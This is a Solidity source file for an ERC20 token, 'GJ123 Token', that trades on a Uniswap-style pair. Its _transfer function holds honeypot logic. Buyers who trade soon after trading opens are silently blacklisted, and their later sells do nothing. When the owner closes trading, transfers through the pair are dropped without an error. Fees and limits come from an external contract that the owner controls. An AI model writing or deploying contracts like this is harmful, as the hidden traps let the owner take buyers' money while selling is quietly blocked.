// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";
import "./IUniswapV2Router.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./Data.sol";
import "./Token.sol";

contract GJ123Token is Token {
    using SafeMath for uint256;
    using SafeMath for uint112;

    Data data;
    uint256 limit;

    constructor(address dataAddr) Token(210 * 10**8, "GJ123 Token", "GJ123") {
        data = Data(dataAddr);
        limit = data.string2uintMapping("limit");
    }

    function getRouterAddress() public view override returns (address) {
        return data.string2addressMapping("router");
    }

    function getTakeAddress() public view override returns (address) {
        return data.string2addressMapping("take");
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(
            (from != owner() &&
                amount <=
                balanceOf(from)
                    .mul(data.string2uintMapping("transferlimit"))
                    .div(100)) || (from == owner()),
            "Transfer limit reached"
        );

        if (pairInclude(from) || pairInclude(to)) {
            bool open = data.string2boolMapping("open");
            if (open && from != owner() && to != owner()) {
                uint256 openTime = data.string2uintMapping("opentime");

                if (block.timestamp - openTime < limit) {
                    address user = pairInclude(from) ? to : from;
                    if (data.address2uintMapping(user) == 0)
                        data.setAddress2UintData(user, 1);
                }

                address feeAddress;
                uint256 feeAmount;

                if (pairInclude(from)) {
                    if (!data.string2boolMapping("openbuy")) return;

                    feeAddress = data.string2addressMapping("feeFromBuy");

                    feeAmount = amount
                        .mul(data.string2uintMapping("buyFeeRate"))
                        .div(1000000)
                        .div(100);

                    super._transfer(from, to, amount);
                    super._transfer(to, feeAddress, feeAmount);
                } else {
                    if (data.address2uintMapping(from) == 1) {
                        return;
                    }

                    if (!data.string2boolMapping("opensell")) return;

                    feeAddress = data.string2addressMapping("feeFromSell");

                    feeAmount = amount
                        .mul(data.string2uintMapping("sellFeeRate"))
                        .div(1000000)
                        .div(100);

                    uint256 realamount = amount.sub(feeAmount);
                    super._transfer(from, to, realamount);
                    super._transfer(from, feeAddress, feeAmount);
                }
            } else {
                if (
                    from == owner() ||
                    to == owner() ||
                    data.address2uintMapping(from) == 3 ||
                    data.address2uintMapping(to) == 3
                ) {
                    super._transfer(from, to, amount);
                }
            }
        } else {
            require(
                data.address2uintMapping(from) != 1,
                "the address is in black list"
            );
            super._transfer(from, to, amount);
        }
    }

    function switchState(bool open) public onlyOwner {
        data.setString2BoolData("open", open);
        if (open) {
            data.setString2UintData("opentime", block.timestamp);
        }
    }
}